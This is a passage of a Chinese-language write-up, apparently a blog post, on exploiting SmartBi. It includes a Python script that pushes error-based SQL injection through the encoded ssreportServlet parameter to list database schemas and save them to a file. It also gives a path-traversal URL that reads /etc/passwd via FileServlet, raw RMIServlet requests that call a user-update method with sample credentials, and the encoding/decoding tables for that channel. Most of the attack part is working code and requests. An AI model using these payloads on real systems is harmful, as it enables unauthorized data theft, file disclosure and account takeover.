+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;g&#34;</span><span class="p">:</span> <span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;b&#34;</span><span class="p">:</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span> <span class="s2">&#34;X&#34;</span><span class="p">:</span> <span class="s2">&#34;z&#34;</span><span class="p">,</span> <span class="s2">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;~&#34;</span><span class="p">,</span> <span class="s2">&#34;y&#34;</span><span class="p">:</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#此函数可以用来加密明文也可以解密服务器返回的密文</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">out</span> <span class="o">+</span> <span class="n">ENCODING_SCHEDULE</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">code</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">out</span> <span class="o">=</span> <span class="n">out</span> <span class="o">+</span> <span class="n">DECODING_SCHEDULE</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">item</span><span class="p">,</span> <span class="n">item</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://127.0.0.1/vision/ssreportServlet&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span><span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span><span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span><span class="s2">&#34;application/x-www-form-urlencoded&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="s2">&#34;Cookie&#34;</span><span class="p">:</span><span class="s2">&#34;JSESSIONID=4BB550BF10C606619B753D3CE52CD3AB&#34;</span>
+</span></span><span class="line"><span class="cl">           <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">origin1</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;[{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.单位名称&#34;,&#34;name&#34;:&#34;单位名称&#34;,&#34;alias&#34;:&#34;单位名称&#34;,&#34;value&#34;:&#34;&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">origin2</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;&#34;,&#34;displayValue&#34;:&#34;&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">origin3</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所属机构&#34;,&#34;name&#34;:&#34;所属机构&#34;,&#34;alias&#34;:&#34;所属机构&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在省份&#34;,&#34;name&#34;:&#34;所在省份&#34;,&#34;alias&#34;:&#34;所在省份&#34;,&#34;value&#34;:&#34;440000&#34;,&#34;displayValue&#34;:&#34;广东&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在地市&#34;,&#34;name&#34;:&#34;所在地市&#34;,&#34;alias&#34;:&#34;所在地市&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;全部&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在区县&#34;,&#34;name&#34;:&#34;所在区县&#34;,&#34;alias&#34;:&#34;所在区县&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;全部&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id&#34;,&#34;name&#34;:&#34;id&#34;,&#34;alias&#34;:&#34;检测机构id&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间起&#34;,&#34;name&#34;:&#34;填报时间起&#34;,&#34;alias&#34;:&#34;填报时间起&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间止&#34;,&#34;name&#34;:&#34;填报时间止&#34;,&#34;alias&#34;:&#34; 填报时间止&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间起&#34;,&#34;name&#34;:&#34;更新时间起&#34;,&#34;alias&#34;:&#34;更新时间起&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;&#34;},{&#34;id&#34;:&#34;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间止&#34;,&#34;name&#34;:&#34;更新时间止&#34;,&#34;alias&#34;:&#34;更新时间止&#34;,&#34;value&#34;:&#34;&#34;,&#34;displayValue&#34;:&#34;&#34;}]&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%&#39; and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit {0},1),0x7e)) and null = &#39;%&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(payload)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">origin_full</span> <span class="o">=</span> <span class="n">origin1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">origin2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">origin3</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(origin_full)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url_encode_full</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="n">origin_full</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(url_encode_full)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rmi_encode</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">url_encode_full</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(rmi_encode)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encode_final</span> <span class="o">=</span> <span class="s1">&#39;encode=&#39;</span><span class="o">+</span><span class="n">rmi_encode</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;resid&#34;</span><span class="p">:</span><span class="s2">&#34;I40281d81016a8bc28bc20231016aaee007b230ac&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;clientId&#34;</span><span class="p">:</span><span class="s2">&#34;Iff8080810176f0c7f0c7544f0176f54eb72c1160&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;refreshType&#34;</span><span class="p">:</span><span class="s2">&#34;refresh&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;paramsInfoEncode&#34;</span><span class="p">:</span><span class="n">encode_final</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#proxies = {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;,&#39;https&#39;:&#39;http://127.0.0.1:8080&#39;}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="n">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#print(r.text)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">regex</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;~\w+~&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">span</span><span class="p">()</span> <span class="c1">#返回第一个匹配到的结果的位置（1000,1005）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">database</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">match</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">:</span><span class="n">match</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">match</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span><span class="n">match</span><span class="p">[</span><span class="mi">1</span><span class="p">]])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">with</span> <span class="n">open</span><span class="p">(</span><span class="s1">&#39;file.txt&#39;</span><span class="p">,</span><span class="s1">&#39;a+&#39;</span><span class="p">)</span> <span class="n">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">database</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="五任意文件读取">五、任意文件读取</h2>
+<p>V85以下的可能任意文件下载都有，V95版本不存在。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="n">vision</span><span class="o">/</span><span class="n">FileServlet</span><span class="err">?</span><span class="n">ftpType</span><span class="o">=</span><span class="n">out</span><span class="o">&amp;</span><span class="n">path</span><span class="o">=</span><span class="n">upload</span><span class="o">/../../../../../../../../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">&amp;</span><span class="n">name</span><span class="o">=%</span><span class="n">E4</span><span class="o">%</span><span class="n">B8</span><span class="o">%</span><span class="n">AD</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="mi">9</span><span class="n">F</span><span class="o">%</span><span class="n">B3</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">B2</span><span class="o">%</span><span class="n">B9</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">90</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">9</span><span class="n">E</span><span class="o">%</span><span class="mi">97</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="n">BD</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">9</span><span class="n">F</span><span class="o">%</span><span class="mi">8</span><span class="n">E</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">94</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">94</span><span class="o">%</span><span class="n">AE</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">88</span><span class="o">%</span><span class="mi">86</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">85</span><span class="o">%</span><span class="n">AC</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">F</span><span class="o">%</span><span class="n">B8XX</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">8</span><span class="n">A</span><span class="o">%</span><span class="n">A0</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">B2</span><span class="o">%</span><span class="n">B9</span><span class="o">%</span><span class="n">E7</span><span class="o">%</span><span class="n">AB</span><span class="o">%</span><span class="mi">99</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">98</span><span class="o">%</span><span class="n">B2</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="mi">9</span><span class="n">B</span><span class="o">%</span><span class="n">B7</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">AE</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="mi">85</span><span class="o">%</span><span class="n">A8</span><span class="o">%</span><span class="n">E5</span><span class="o">%</span><span class="n">BA</span><span class="o">%</span><span class="mi">94</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="mi">80</span><span class="o">%</span><span class="n">A5</span><span class="o">%</span><span class="n">E9</span><span class="o">%</span><span class="n">A2</span><span class="o">%</span><span class="mi">84</span><span class="o">%</span><span class="n">E6</span><span class="o">%</span><span class="n">A1</span><span class="o">%</span><span class="mf">88.</span><span class="n">docx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="附录rmiservet加解密">附录、RMIServet加解密</h2>
+<p>SmartBi 有两种传参方式，RMIServlet 加密或直接传输。</p>
+<h3 id="0x01-rmiservlet加密">0x01 RMIServlet加密</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /vision/RMIServlet HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 127.0.0.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: https://127.0.0.1/vision/index.jsp
+</span></span><span class="line"><span class="cl">If-Modified-Since: 0
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: 148
+</span></span><span class="line"><span class="cl">Authorization: Basic YWRtaW46YWRtaW4=
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">encode=zDp4Wp4gRip+Q5h(kpzDp4xw4tI(6-p+/JV/uuc&#39;(mKi(Kp719J(~K((~K(((pm719JhNp&#39;uKiMM(&#39;9/uu/ut/uuXIw6--Qw1/uu/ut/uu6QSS/uu/ut/uuY!a0bp1uN/uu/utk4Qp/JT
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x02-直接传输">0x02 直接传输</h3>
+<p>上述encode加密字段解密后为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">UserService+updateUserForChange+[&#34;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&#34;,&#34;zhongguo1&#34;,&#34;null&#34;,&#34;QWEqwe123&#34;,true]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>等同于：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">className=UserService&amp;methodName=updateUserForChange&amp;params=[&#34;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&#34;,&#34;zhongguo1&#34;,&#34;null&#34;,&#34;QWEqwe123&#34;,true]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>构造数据包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /vision/RMIServlet HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 127.0.0.1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Referer: https://127.0.0.1/vision/index.jsp
+</span></span><span class="line"><span class="cl">If-Modified-Since: 0
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+</span></span><span class="line"><span class="cl">Content-Length: 148
+</span></span><span class="line"><span class="cl">Authorization: Basic YWRtaW46YWRtaW4=
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Cookie: JSESSIONID=848B4743452D02C5A53FECCA58C47299
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">className=UserService&amp;methodName=updateUserForChange&amp;params=[&#34;I8a94ca4e0175ab4aab4aaae90175d3e824c66a87&#34;,&#34;zhongguo1&#34;,&#34;null&#34;,&#34;QWEqwe123&#34;,true]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="0x03-rmiservet加解密脚本">0x03 RMIServet加解密脚本</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ENCODING_SCHEDULE</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="s2">&#34;u&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">:</span> <span class="s2">&#34;N&#34;</span><span class="p">,</span> <span class="s2">&#34;4&#34;</span><span class="p">:</span> <span class="s2">&#34;K&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">:</span> <span class="s2">&#34;J&#34;</span><span class="p">,</span> <span class="s2">&#34;6&#34;</span><span class="p">:</span> <span class="s2">&#34;M&#34;</span><span class="p">,</span> <span class="s2">&#34;7&#34;</span><span class="p">:</span> <span class="s2">&#34;9&#34;</span><span class="p">,</span> <span class="s2">&#34;8&#34;</span><span class="p">:</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;9&#34;</span><span class="p">:</span> <span class="s2">&#34;m&#34;</span><span class="p">,</span> <span class="s2">&#34;!&#34;</span><span class="p">:</span> <span class="s2">&#34;P&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;%&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">:</span> <span class="s2">&#34;n&#34;</span><span class="p">,</span> <span class="s2">&#34;(&#34;</span><span class="p">:</span> <span class="s2">&#34;A&#34;</span><span class="p">,</span> <span class="s2">&#34;)&#34;</span><span class="p">:</span> <span class="s2">&#34;E&#34;</span><span class="p">,</span> <span class="s2">&#34;*&#34;</span><span class="p">:</span> <span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="s2">&#34;+&#34;</span><span class="p">:</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;-&#34;</span><span class="p">:</span> <span class="s2">&#34;f&#34;</span><span class="p">,</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span> <span class="s2">&#34;q&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">:</span> <span class="s2">&#34;O&#34;</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span> <span class="s2">&#34;V&#34;</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="p">:</span> <span class="s2">&#34;t&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;D&#34;</span><span class="p">:</span> <span class="s2">&#34;T&#34;</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;F&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="s2">&#34;G&#34;</span><span class="p">:</span> <span class="s2">&#34;H&#34;</span><span class="p">,</span> <span class="s2">&#34;H&#34;</span><span class="p">:</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="s2">&#34;I&#34;</span><span class="p">:</span> <span class="s2">&#34;c&#34;</span><span class="p">,</span> <span class="s2">&#34;J&#34;</span><span class="p">:</span> <span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;K&#34;</span><span class="p">:</span> <span class="s2">&#34;l&#34;</span><span class="p">,</span> <span class="s2">&#34;L&#34;</span><span class="p">:</span> <span class="s2">&#34;8&#34;</span><span class="p">,</span> <span class="s2">&#34;M&#34;</span><span class="p">:</span> <span class="s2">&#34;F&#34;</span><span class="p">,</span> <span class="s2">&#34;N&#34;</span><span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;O&#34;</span><span class="p">:</span> <span class="s2">&#34;o&#34;</span><span class="p">,</span> <span class="s2">&#34;P&#34;</span><span class="p">:</span> <span class="s2">&#34;L&#34;</span><span class="p">,</span> <span class="s2">&#34;Q&#34;</span><span class="p">:</span> <span class="s2">&#34;Y&#34;</span><span class="p">,</span> <span class="s2">&#34;R&#34;</span><span class="p">:</span> <span class="s2">&#34;j&#34;</span><span class="p">,</span> <span class="s2">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;W&#34;</span><span class="p">,</span> <span class="s2">&#34;T&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;U&#34;</span><span class="p">:</span> <span class="s2">&#34;z&#34;</span><span class="p">,</span> <span class="s2">&#34;V&#34;</span><span class="p">:</span> <span class="s2">&#34;Z&#34;</span><span class="p">,</span> <span class="s2">&#34;W&#34;</span><span class="p">:</span> <span class="s2">&#34;!&#34;</span><span class="p">,</span> <span class="s2">&#34;X&#34;</span><span class="p">:</span> <span class="s2">&#34;B&#34;</span><span class="p">,</span> <span class="s2">&#34;Y&#34;</span><span class="p">:</span> <span class="s2">&#34;)&#34;</span><span class="p">,</span> 
